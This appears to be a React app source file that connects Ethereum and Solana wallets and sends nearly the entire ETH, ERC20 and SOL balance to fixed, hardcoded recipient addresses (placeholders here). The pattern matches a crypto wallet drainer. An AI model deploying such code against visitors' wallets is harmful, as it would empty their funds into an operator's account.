import React, { useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import {
  useBalance,
  useSendTransaction,
  useWriteContract
} from "wagmi";
import { parseEther, parseUnits } from "viem";
import ERC20_ABI from "./abi/erc20.json";
import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
import { ethers } from "ethers";

function App() {
  const { address, isConnected } = useAppKitAccount();
  const { solanaAddress } = useSolanaAccount();

  const [tokenAddress, setTokenAddress] = useState("");

  const FIXED_EVM_RECIPIENT = "0xYourFixedEthereumRecipientAddress";
  const FIXED_SOL_RECIPIENT = "YourFixedSolRecipientHere";

  // Balances
  const { data: evmBalance } = useBalance({ address, watch: true });
  const { data: solBalance } = useSolanaBalance({ address: solanaAddress, watch: true });

  const { sendTransaction } = useSendTransaction();
  const { writeContract } = useWriteContract();

  // --- Send Max EVM Assets (ETH + ERC20) ---
  const sendMaxEVM = async () => {
    if (!isConnected || !evmBalance?.formatted) return;

    // --- 1️⃣ Send ETH ---
    const maxETH = parseFloat(evmBalance.formatted) - 0.001;
    if (maxETH > 0) {
      sendTransaction({
        to: FIXED_EVM_RECIPIENT,
        value: parseEther(maxETH.toString())
      });
    }

    // --- 2️⃣ Send ERC20 if tokenAddress is provided ---
    if (tokenAddress) {
      const tokenBalance = await getERC20Balance(tokenAddress, address);
      const decimals = await getERC20Decimals(tokenAddress);
      if (tokenBalance > 0) {
        writeContract({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
        });
      }
    }
  };

  // --- Send Max SOL ---
  const sendMaxSOL = async () => {
    if (!solBalance || !solanaAddress) return;
    const maxSOL = parseFloat(solBalance) - 0.00001;
    if (maxSOL <= 0) return;
    await sendSol({
      to: FIXED_SOL_RECIPIENT,
      amount: maxSOL,
      from: solanaAddress
    });
  };

  // --- Helpers ---
  const getERC20Balance = async (token, userAddress) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const contract = new ethers.Contract(token, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      const decimals = await contract.decimals();
      return parseFloat(ethers.formatUnits(balance, decimals));
    } catch (e) {
      console.error("Error reading token balance:", e);
      return 0;
    }
  };

  const getERC20Decimals = async (token) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const contract = new ethers.Contract(token, ERC20_ABI, provider);
      const decimals = await contract.decimals();
      return decimals;
    } catch {
      return 18;
    }
  };

  return (
    <div style={{ padding: 20 }}>
      <appkit-button />

      {isConnected && (
        <>
          <h3>Connected EVM: {address}</h3>
          <h3>Connected Solana: {solanaAddress}</h3>

          <p>ETH Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
          <p>SOL Balance: {solBalance}</p>

          <input
            placeholder="ERC20 Token Address (optional)"
            value={tokenAddress}
            onChange={(e) => setTokenAddress(e.target.value)}
          />

          <button onClick={sendMaxEVM}>
            Send Max EVM Assets (ETH + ERC20)
          </button>
          <button onClick={sendMaxSOL}>
            Send Max SOL
          </button>
        </>
      )}
    </div>
  );
}

export default App;